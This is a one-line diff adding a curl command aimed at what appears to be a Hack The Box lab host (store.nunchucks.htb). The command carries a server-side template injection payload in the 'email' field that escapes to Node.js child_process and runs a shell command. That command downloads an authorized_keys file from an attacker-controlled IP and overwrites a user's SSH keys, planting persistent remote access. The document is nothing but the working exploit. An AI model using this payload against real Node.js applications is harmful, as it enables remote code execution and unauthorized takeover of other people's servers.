@@ -1,0 +1,1 @@
+curl -X POST https://store.nunchucks.htb/api/submit -d "email={{\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('curl 10.10.14.14:8000/authorized_keys -o /home/david/.ssh/authorized_keys').toString()\")()}}" -k
